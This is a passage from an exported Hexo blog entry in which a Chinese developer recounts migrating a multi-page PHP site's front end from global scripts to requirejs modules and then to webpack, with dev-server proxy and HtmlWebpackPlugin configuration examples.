}\n}\n```\n让我来解释一下上面的代码：未匹配到以`__webpack`开头的请求，都进行代理，这里添加了一个`assetsSubDirectory`变量，这个变量其实是webpack生成的**图片、字体文件、json文件、svg**等仍然存在于内存里的引用的路径，因为在内存里随着我们的编码可能实时变动，所以它们还是不需要做代理，直接过滤掉。\n\n对了，遗漏了一个很重要的配置，代码如下：\n```javascript\nplugins: [\n  new HtmlWebpackPlugin( {\n    alwaysWriteToDisk: true,\n    // php端使用到的模板\n    filename: `${ROOT}/Application/Home/View/Index/index.html`,\n    // 模板文件\n    template: `${ROOT}/Application/Home/View-template/Index/index.html`,\n    chunks: [ '__webpack-indexController' ],\n    inject: true\n  })\n]\n```\n机智的我们肯定能发现`View-template`这里的不同，见名知意，这个文件夹里的html都是对应的后端的模板视图文件，我们通过`alwaysWriteToDisk`这个参数（其实还需要配合另外一个插件）以`template`字段的值为目标，实时写入到`filename`对应的文件里，而此时，因为浏览器访问的页面里因为我们启动`webpack-dev-server`时已经编译了这个文件，js会主动和webpack服务建立一个`eventSource`长连接（这个连接也是排除在代理范围内的）来监听文件变化，所以就会自动刷新浏览器，从而实现我们的`live-reload`。\n\n至此，从`准现代期`到`现代期`的过渡方案就算是完成了，接下面便是寻找一个合适的时间点实施到项目中去。若你要问我那么多页面是不是全都一个个得配，当然是，但是为了方便易维护，能不侵入现有项目去修改文件名，我们肯定需要去手动编写一个`map`映射文件，来指明我们的模板文件对应的入口文件，通过这个map我们再来动态生成`entry`和`HtmlWebpackPlugin`需要的模板路径，当然这里并不是没有便捷的办法，我们可以写一个脚本去读取`View-template`下面的目录来自动生成map但是因为我们童鞋在命名的时候文件夹和对应的入口文件并不能对应上，就得修改，这并不是推荐的做法，而且也不方便我们在改造代码风格的时候进行单个调试。\n\n上面的示例代码都不是完整的，因为我并不是要提供一个`webpack`的教程，而是解决后端和前端html耦合的`webpack-dev-server`配置的问题。","slug":"new-front-end","published":1,"updated":"2017-07-24T14:52:28.283Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000ui4uch0u3dfga","content":"<p>博主是14年入的程序员大军，当时主<code>java</code>兼具前端开发的活儿，在现在看来的一些流开发框架和新兴思想，早在<code>node.js</code>开始进入大家视野的时候就流行起来了，只是在那时博主并没有关注前端的生态圈（然而java好像也并没有关注，逃），所以还是处在很多人所描述的<code>刀耕火种</code>的阶段，前端代码全部挂载到全局作用域，包括插件导出的变量。那更别提<code>组件化</code>和<code>模块化</code>的编程思想了，甚至代码都不用压缩优化就直接上传到服务器发布了。</p>\n<p>后来换了一家公司，没有<strong>前端开发</strong>这个职位，是从javaer转过去的，因为项目需要，渐渐的也就坐实了这个岗位。项目到现在（2014年8月-2017年7月22日）一共出现了三个阶段</p>\n<blockquote>\n<ul>\n<li>用着十年前的开发（或者叫整合）技术的<strong>简陋期</strong></li>\n<li>经历4、5个月的半模块化改造的<strong>准现代期</strong></li>\n<li>到现在能整合全局资源（仅限web静态资源）,随意整合新技术的<strong>现代期</strong>（未实施）</li>\n</ul>\n</blockquote>\n<p>为什么要不断的去折腾，去改造？仅仅是为了跟上“现代”的步伐吗？下面我将讲述每个阶段是如何无痛改造的，为什么要改造。</p>\n<h3><span id=\"从简陋期到准现代期\">从<code>简陋期</code>到<code>准现代期</code></span></h3>\n<p>举个例子，我们以前的代码是这样的</p>\n<h4><span id=\"html页面部分\">html页面部分</span></h4>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 通用的代码 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"common.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 第三方的插件代码 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"plugin.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 我们的主入口 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"individual.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h4><span id=\"javascript部分\">javascript部分</span></h4>\n<p>在<code>common.js</code>里，是我们的定义的通用函数，比如一些特定组件的部分代码如<code>header</code>或<code>footer</code>，或者是字符串处理，日期格式化的函数等等，这些函数都以对象或函数的形式暴露在全局作用域里，<strong>非常的冗杂</strong>和不安全，随着代码量的增加，容易导致覆盖，出现难以预料的bug，还有一个致命的弱点就是无法按需加载资源，我哪怕只是用到了其中一个小小的常量，都需要引用整个文件，然后从全局作用域里拿。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> Header = &#123;</span><br><span class=\"line\">  var1: <span class=\"string\">''</span>,</span><br><span class=\"line\">  var2: &#123;&#125;,</span><br><span class=\"line\">  fn1: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// some code</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  fn2: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// some code</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">strReplace</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// some code</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// individual.js</span></span><br><span class=\"line\"><span class=\"comment\">// 也许我们早已有觉悟 使用了自执行匿名函数来防止全局变量的污染</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 这里我们需要用到commonjs的函数 常量等</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> afterHandleStr = strReplace(str);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 也许我们忘记strReplace函数已存在全局作用域又或者换了一个人</span></span><br><span class=\"line\">  <span class=\"comment\">// 来维护这个文件可能又会定义一个函数叫strReplace</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">strReplace</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 那么此时根据javascript特性，原先的函数已经被覆盖了，</span></span><br><span class=\"line\">    <span class=\"comment\">// 上面的调用逻辑优先从最近的作用域开始找，于是会执行到这里</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  ...</span><br><span class=\"line\">&#125;());</span><br></pre></td></tr></table></figure>\n<p>因为项目是迭代开发的，功能一点点叠加上去，考虑到整个项目的生命周期，不至于到后期完全无法维护，所以我们必须以优雅的姿态去重构整个项目的资源引用方式，那就是<strong>模块化</strong>，一个模块做一件事情，并暴露它对外提供的接口以供具象化的页面来使用。比如<code>header</code>，<code>footer</code>，<code>nav</code>，<code>sidebar</code>，<code>utils</code>等等。前端的模块化有俩个标准，一个<code>AMD(Asynchronous Module Definition)</code>，一个是<code>CMD(Common Module Definition)</code>，前者是<strong>异步模块定义，推崇依赖前置</strong>，后者是<strong>通用模块定义，推崇依赖就近</strong>，AMD的代表框架有<code>requirejs</code>，CMD的代表框架有<code>seajs</code>，都是很优秀的作品，<a href=\"https://www.zhihu.com/question/20351507\" target=\"_blank\" rel=\"noopener\">这里对二者有详细的介绍</a>。最后我选择了<code>requirejs</code>作为本次重构的基础，其实就当是的代码来说，改造起来并没有什么难度，就是需要细心，细心，细心，只需要将<code>common.js</code>这个通用模块进行拆分就好了，页面只需要引入一个js文件，如下面这样</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">data-main</span>=<span class=\"string\">\"/individual.js\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/require.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>data-main</code>是我们的代码主入口，<code>src</code>是<code>requireJs</code>的源码。从文件引用来说，至少我们不必再关心每次使用一个插件都要手动来加入一个<code>script</code>标签了，如何引用呢？我下面会介绍。<br>\n假如我们以前的代码是这样的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common.js</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> exportObj = &#123;</span><br><span class=\"line\">    aa: <span class=\"string\">'aa'</span>,</span><br><span class=\"line\">    bb: <span class=\"string\">'bb'</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> utils = &#123;</span><br><span class=\"line\">    replaceStr: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 放到全局作用域</span></span><br><span class=\"line\">  <span class=\"built_in\">window</span>.exportObj = exportObj;</span><br><span class=\"line\">  <span class=\"built_in\">window</span>.utils = utils;</span><br><span class=\"line\">&#125;());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// individual。js</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = constants.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = constants.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;());</span><br></pre></td></tr></table></figure>\n<p>上面的代码使用了两个全局对象，<code>constants</code>和<code>utils</code>，那么改造后应该是：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// constants.js</span></span><br><span class=\"line\"><span class=\"comment\">// 如果它不依赖于其他模块，就不必声明依赖的数组</span></span><br><span class=\"line\">define( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> exportObj = &#123;</span><br><span class=\"line\">    aa: <span class=\"string\">'aa'</span>,</span><br><span class=\"line\">    bb: <span class=\"string\">'bb'</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回我们要暴露出来的对象，不用再放到全局作用域</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> exportObj;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// utils.js</span></span><br><span class=\"line\">define( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 返回我们要暴露出来的对象，不用再放到全局作用域</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span>  &#123;</span><br><span class=\"line\">    replaceStr: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// individual</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> consts, utils </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"><span class=\"comment\">// 或者</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> consts = <span class=\"built_in\">require</span>(<span class=\"string\">'constants'</span>);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> utils = <span class=\"built_in\">require</span>(<span class=\"string\">'utils'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>是不是感觉毫无挑战性，对，这就是一个体力活，细心点就好了</p>\n<blockquote>\n<p>我们不必担心还需要手动去改动第三方插件，现在的主流插件基本都会<code>UMD</code>方式去适配，也就是兼容了<code>AMD</code>，<code>CMD</code>，所以只需要直接引用第三方插件就行了，不必再去html文件里手动引用script标签了，其他具体实现细节和必备的配置可以参照<a href=\"http://requirejs.org/\" target=\"_blank\" rel=\"noopener\">requirejs官网</a>的例子</p>\n</blockquote>\n<p>等到改造完，也还没有愉快的结束，我们的<strong>准现代期</strong>增加了一个优化环节，官方提供了<code>r.js</code>这个优化器来帮我们打包压缩代码（毕竟生产环境过多的请求数还是不被允许的），此时的改造才真的做到了<strong>模块化</strong>，<strong>能优化</strong>，从<strong>简陋期</strong>无痛过渡到<strong>准现代期</strong>。此时的代码，其实已经具备了进入<strong>现代期</strong>的要求，那就是<strong>规范模块化</strong>。下面是我们即将进行的改造，顺利过渡到<strong>现代期</strong>，从而拥抱你想使用的新技术</p>\n<h3><span id=\"从准现代期到现代期\">从<code>准现代期</code>到<code>现代期</code></span></h3>\n<p>其实这个阶段，因为对一些新工具新技术的不熟悉，绕了很多弯子，花费了不少的精力，好在弄出来了，基于<code>webpack</code>构建工具，解放键盘<code>F5</code>，加入代码风格和规范的检查工具，加入<code>ECMAScript 6</code>语法转换工具等等，为什么要使用这些，概括为主要以下几点：</p>\n<ul>\n<li>提升开发效率和代码质量</li>\n<li>新语法新和技术能解决开发上的很多痛点和盲点</li>\n<li>强大的整合性和包容性（相对于封闭的<code>r.js</code>优化器终于可定制了）</li>\n<li>emmmmmm思考中</li>\n</ul>\n<p>首先我们介绍一下<code>webapck</code>是什么<br>\n<img src=\"webpack.png\" alt=\"webpack\"><br>\n这是<code>webpack</code>官方文档首页对其的简单描述（ps: 其实中间的正方体是会旋转的哦），强大的<code>webpack</code>能整合所有依赖的文件进行处理，如<code>less</code>编译（依赖<code>less-loader</code>），<code>ES6</code>语法转换（依赖<code>babel-loader</code>），文件<code>hash</code>添加，自动上传ftp发布生产环境等等。还有就是<code>webpack-dev-server</code>这个开发神器，<strong>热替换</strong>、<strong>自动监测文件变化刷新浏览器</strong>，虽然<code>现代期</code>并没有用到实际项目中去，但是到现在（2017年7月22日）,我已经能完全拿出一套方案，使现有项目平滑过度到<code>webpack</code>。（ps：网上的教程大多是基于单页单入口的SPA应用，和后端完全解耦的，我们的项目是和后端处于半解耦状态，并且是多页多入口，所以并不能使用大多数的webpack配置文件，需要进行变通处理）</p>\n<p>我们先来说说处理一般的<code>SPA</code>应用的配置参数</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  entry: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// webpack生成的文件名和入口文件</span></span><br><span class=\"line\">    <span class=\"comment\">// 我们是多页入口，先以首页为例</span></span><br><span class=\"line\">    index: <span class=\"string\">'./Public/dev/page/main.js'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  output: &#123;</span><br><span class=\"line\">    path: config.build.assetsRoot,</span><br><span class=\"line\">    filename: <span class=\"string\">'[name].js'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"built_in\">module</span>: &#123;</span><br><span class=\"line\">    rules: [  &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 各种loaders</span></span><br><span class=\"line\">    &#125; ]</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  plugins: [</span><br><span class=\"line\">    <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 模板生成后的文件名（可以加上路径）</span></span><br><span class=\"line\">      filename: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">      <span class=\"comment\">// 入口文件的模板（也就是承载你页面视图的地方）</span></span><br><span class=\"line\">      template: <span class=\"string\">'index.html'</span>,</span><br><span class=\"line\">      inject: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>抛开其他杂七杂八配置不谈，上面的配置就是大多数的<code>SPA</code>应用的配置。用在我们的项目里，在根目录运行<code>webpack</code>会发现发生错误，并提示缺少很多的模块，因为这些我们自定义的模块<code>webpack</code>本身并不能识别，所以这里有至关重要的一步，将现有的<code>requirejs</code>的配置文件里的<code>paths</code>同步迁移到<code>webpack</code>的配置文件里</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在requirejs配置文件里可能是这样写的</span></span><br><span class=\"line\"><span class=\"built_in\">require</span>.config( &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  paths: &#123;</span><br><span class=\"line\">    header: <span class=\"string\">'./modules/header'</span>,</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; );</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 那么我们就应该将此配置交给webpack</span></span><br><span class=\"line\">resolve: &#123;</span><br><span class=\"line\">  alias: &#123;</span><br><span class=\"line\">    header: <span class=\"string\">'modules/header'</span> <span class=\"comment\">// 路径可能不一定是这个</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后我们再打包，运行，发现丫的居然会报错了？最明显的错误就是<code>define is not defined</code>。让我们来翻翻上面我们<strong>准现代期</strong>的代码</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// individual</span></span><br><span class=\"line\">define( [</span><br><span class=\"line\">  <span class=\"string\">'constants'</span>,</span><br><span class=\"line\">  <span class=\"string\">'utils'</span></span><br><span class=\"line\">], <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> consts, utils </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\">&#125; );</span><br></pre></td></tr></table></figure>\n<p>这里的<code>define</code>就是报错的原因（<code>webpack</code>有时候并不能识别这里，有时候却又能正确转换成能运行的代码，没有深究这里的原因，虽然<code>webpack2</code>已经支持AMD风格的代码打包，但是我还是决定对这里稍作修改，变成CMD风格，即使是使用<code>CMD</code>风格的<code>seajs</code>依然是需要去掉外面那层包裹的函数的，不管怎样都得改）,于是我们只需要将上面的代码调整为：</p>\n<hr>\n<p>2017年7月24日22点50分更新，经过我的尝试，只要配置依赖都正确，完全可以直接打包，不用非得改成CMD，于是换成<code>webpack</code>更轻松了~~😝</p>\n<hr>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> consts = <span class=\"built_in\">require</span>(<span class=\"string\">'constants'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> utils = <span class=\"built_in\">require</span>(<span class=\"string\">'utils'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> aa = consts.aa;</span><br><span class=\"line\"><span class=\"keyword\">var</span> bb = consts.bb;</span><br><span class=\"line\"><span class=\"keyword\">var</span> tempStr = utils.replaceStr(<span class=\"string\">'tempStr'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果这里有return的话需要将return obj调整为</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = 